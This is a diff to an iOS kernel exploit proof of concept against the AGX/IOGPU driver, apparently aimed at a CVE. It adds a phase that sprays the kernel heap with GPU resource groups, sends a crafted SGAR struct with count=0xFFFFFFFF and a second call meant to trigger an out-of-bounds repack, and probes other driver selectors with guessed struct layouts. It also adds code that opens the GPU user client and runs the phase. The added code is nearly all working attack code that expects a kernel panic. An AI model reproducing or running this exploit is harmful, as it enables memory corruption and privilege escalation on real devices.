@@ -781,6 +781,119 @@ static void trigger_phase7(io_connect_t conn) {
     evf("[P7] DONE — if panic with GPR=0x%016llx -> F-109 CONFIRMED -> F-74 path", COMMPAGE_FLAG);
 }
 
+/*
+ * trigger_phase8: Direct SGAR double-call to trigger F-109.
+ *
+ * Hypothesis: SGAR(count=0xFFFFFFFF) sets internal COUNT=-1 at [memset+0x424].
+ * SGAR called again on the same group triggers IOGPUResidentMemorySet::repack()
+ * internally, which reads [memset+0x424]=-1 → alloc_size=-16 → backward OOB.
+ *
+ * Also tries: SGAR(count=0) then sel=12 struct(gid, count=1 at various offsets)
+ * to find the REMOVE struct format.
+ */
+static void trigger_phase8(io_connect_t conn) {
+    evf("[P8] START: SGAR double-call F-109 trigger");
+
+    /* Groom kalloc_type_var with count=15 groups */
+    uint32_t g8_groom[512];
+    int g8_valid = 0;
+    for (int gi = 0; gi < 512; gi++) {
+        uint64_t g = try_sgar_q(conn, 15);
+        if (g) g8_groom[g8_valid++] = (uint32_t)g;
+    }
+    evf("[P8] GROOM: %d/512 count=15 groups", g8_valid);
+
+    /* Step 1: Create G1 with count=0xFFFFFFFF -> internal COUNT=-1 */
+    static uint8_t s8a[SGAR_STRUCT_SIZE];
+    uint8_t o8a[0x10]; size_t o8a_sz = sizeof(o8a); uint32_t c8a = 0;
+    memset(s8a, 0, sizeof(s8a));
+    *(uint32_t *)(s8a + SGAR_COUNT_OFFSET) = 0xFFFFFFFF;
+    *(uint32_t *)(s8a + 0x28) = (uint32_t)(COMMPAGE_FLAG & 0xFFFFFFFF);
+    *(uint32_t *)(s8a + 0x2C) = (uint32_t)(COMMPAGE_FLAG >> 32);
+    kern_return_t k8a = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, s8a, sizeof(s8a), NULL, &c8a, o8a, &o8a_sz);
+    uint64_t g8_target = (k8a == 0) ? *(uint64_t *)o8a : 0;
+    evf("[P8] SGAR(count=0xFFFFFFFF) kr=0x%x gid=0x%llx", k8a, g8_target);
+
+    if (!g8_target) { evf("[P8] ABORT: G1 creation failed"); goto p8_sel12; }
+
+    /* Step 2: SGAR again on G1 (count=1) -> should trigger repack(internal_COUNT=-1) */
+    {
+        static uint8_t s8b[SGAR_STRUCT_SIZE];
+        uint8_t o8b[0x10]; size_t o8b_sz = sizeof(o8b); uint32_t c8b = 0;
+        memset(s8b, 0, sizeof(s8b));
+        *(uint32_t *)(s8b + 0x00) = (uint32_t)g8_target;
+        *(uint32_t *)(s8b + 0x04) = (uint32_t)(g8_target >> 32);
+        *(uint32_t *)(s8b + SGAR_COUNT_OFFSET) = 1;
+        *(uint32_t *)(s8b + 0x28) = (uint32_t)(COMMPAGE_FLAG & 0xFFFFFFFF);
+        kern_return_t k8b = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, s8b, sizeof(s8b), NULL, &c8b, o8b, &o8b_sz);
+        evf("[P8] SGAR(g8_target,count=1) -> REPACK?: kr=0x%x", k8b);
+    }
+
+p8_sel12:;
+    /* Also try: create G2 with count=4, then call sel=12 STRUCT with different
+     * count-field offsets to find the REMOVE struct layout */
+    uint64_t g8_four = try_sgar_q(conn, 4);
+    evf("[P8] G_FOUR count=4: gid=0x%llx", g8_four);
+    if (!g8_four) { evf("[P8] ABORT: G_FOUR failed"); return; }
+
+    /* Try sel=12 and sel=14 with different struct layouts for (gid, count_to_remove=5) */
+    for (int target_sel = 12; target_sel <= 14; target_sel += 2) {
+        /* Layout A: gid at [0..7], count at [8..11] */
+        {
+            static uint8_t lA[64]; memset(lA, 0, sizeof(lA));
+            *(uint64_t *)(lA + 0) = g8_four;
+            *(uint32_t *)(lA + 8) = 5;
+            uint8_t oA[0x20]; size_t oA_sz=sizeof(oA); uint32_t cA=0;
+            kern_return_t krA = IOConnectCallMethod(conn, target_sel, NULL,0,lA,sizeof(lA),NULL,&cA,oA,&oA_sz);
+            evf("[P8] sel=%d STRUCT[gid@0,count@8=5] kr=0x%x", target_sel, krA);
+        }
+        /* Layout B: gid at [0..7], count at [16..19] */
+        {
+            static uint8_t lB[64]; memset(lB, 0, sizeof(lB));
+            *(uint64_t *)(lB + 0) = g8_four;
+            *(uint32_t *)(lB + 16) = 5;
+            uint8_t oB[0x20]; size_t oB_sz=sizeof(oB); uint32_t cB=0;
+            kern_return_t krB = IOConnectCallMethod(conn, target_sel, NULL,0,lB,sizeof(lB),NULL,&cB,oB,&oB_sz);
+            evf("[P8] sel=%d STRUCT[gid@0,count@16=5] kr=0x%x", target_sel, krB);
+        }
+        /* Layout C: gid at [0..3] (32-bit), count at [4..7] */
+        {
+            static uint8_t lC[64]; memset(lC, 0, sizeof(lC));
+            *(uint32_t *)(lC + 0) = (uint32_t)g8_four;
+            *(uint32_t *)(lC + 4) = 5;
+            uint8_t oC[0x20]; size_t oC_sz=sizeof(oC); uint32_t cC=0;
+            kern_return_t krC = IOConnectCallMethod(conn, target_sel, NULL,0,lC,sizeof(lC),NULL,&cC,oC,&oC_sz);
+            evf("[P8] sel=%d STRUCT[gid32@0,count@4=5] kr=0x%x", target_sel, krC);
+        }
+        /* Layout D: resource handles at [0..N], count implied by struct size */
+        {
+            static uint8_t lD[64]; memset(lD, 0, sizeof(lD));
+            *(uint64_t *)(lD + 0) = g8_four; /* gid */
+            /* 5 resource handles of 4 bytes each at [8..27] */
+            for (int ri = 0; ri < 5; ri++)
+                *(uint32_t *)(lD + 8 + ri*4) = (uint32_t)(ri + 0x1000);
+            uint8_t oD[0x20]; size_t oD_sz=sizeof(oD); uint32_t cD=0;
+            kern_return_t krD = IOConnectCallMethod(conn, target_sel, NULL,0,lD,sizeof(lD),NULL,&cD,oD,&oD_sz);
+            evf("[P8] sel=%d STRUCT[gid@0,handles@8..27] kr=0x%x", target_sel, krD);
+        }
+        /* After layout probes, try SGAR trigger to see if any layout removed resources */
+        {
+            static uint8_t sT[SGAR_STRUCT_SIZE]; memset(sT, 0, sizeof(sT));
+            *(uint32_t *)(sT + 0x00) = (uint32_t)g8_four;
+            *(uint32_t *)(sT + 0x04) = (uint32_t)(g8_four >> 32);
+            *(uint32_t *)(sT + SGAR_COUNT_OFFSET) = 1;
+            *(uint32_t *)(sT + 0x28) = (uint32_t)(COMMPAGE_FLAG & 0xFFFFFFFF);
+            uint8_t oT[0x10]; size_t oT_sz=sizeof(oT); uint32_t cT=0;
+            kern_return_t krT = IOConnectCallMethod(conn, SGAR_SELECTOR,
+                NULL, 0, sT, sizeof(sT), NULL, &cT, oT, &oT_sz);
+            evf("[P8] REPACK_PROBE sel=%d: SGAR(g_four,1) kr=0x%x", target_sel, krT);
+        }
+    }
+    evf("[P8] DONE — if panic: F-109 confirmed -> proceed to F-74");
+}
+
 static void trigger_bof_iokit(void) {
     evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
         SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);
@@ -1031,6 +1144,34 @@ void run_cve28882_poc(UIWindow *window) {
                                     trigger_phase7(conn7);
                                     IOServiceClose(conn7);
                                     evf("[P7] CONN7 closed");
+
+                                    /* Phase 8: SGAR double-call + sel12/14 struct probe */
+                                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
+                                                   dispatch_get_main_queue(), ^{
+                                        mach_port_t mp8 = 0;
+                                        IOMasterPort(MACH_PORT_NULL, &mp8);
+                                        io_connect_t conn8 = 0;
+                                        const char *svc8[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
+                                        for (int si8 = 0; svc8[si8] && !conn8; si8++) {
+                                            CFMutableDictionaryRef m8 = IOServiceMatching(svc8[si8]);
+                                            io_iterator_t it8 = 0;
+                                            IOServiceGetMatchingServices(mp8, m8, &it8);
+                                            io_service_t sv8 = IOIteratorNext(it8);
+                                            IOObjectRelease(it8);
+                                            if (!sv8) continue;
+                                            kern_return_t kr8 = IOServiceOpen(sv8, mach_task_self(), 1, &conn8);
+                                            IOObjectRelease(sv8);
+                                            if (kr8 != 0) conn8 = 0;
+                                        }
+                                        if (conn8) {
+                                            evf("[P8] CONN8 ready=0x%x", conn8);
+                                            trigger_phase8(conn8);
+                                            IOServiceClose(conn8);
+                                            evf("[P8] CONN8 closed");
+                                        } else {
+                                            evf("[P8] CONN8 failed");
+                                        }
+                                    });
                                 } else {
                                     evf("[P7] CONN7 failed: cannot open for Phase 7");
                                 }
